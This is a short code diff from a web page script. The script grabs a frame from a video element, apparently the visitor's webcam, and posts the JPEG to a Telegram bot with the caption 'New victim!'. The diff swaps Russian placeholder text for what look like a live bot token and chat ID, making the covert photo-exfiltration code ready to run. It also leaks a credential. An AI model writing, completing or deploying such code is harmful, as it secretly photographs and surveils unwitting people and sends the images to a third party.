@@ -36,11 +36,11 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const photo = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    fetch('https://api.telegram.org/botТВОЙ_ТОКЕН/sendPhoto', {
+                    fetch('https://api.telegram.org/bot8030379259:AAHGlai2IkpAjobGwAwMZaI6GkF4vxJkN7M/sendPhoto', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            chat_id: 'ТВОЙ_ID',
+                            chat_id: '6600491178',
                             photo: photo.split(',')[1],
                             caption: '📸 New victim!'
                         })
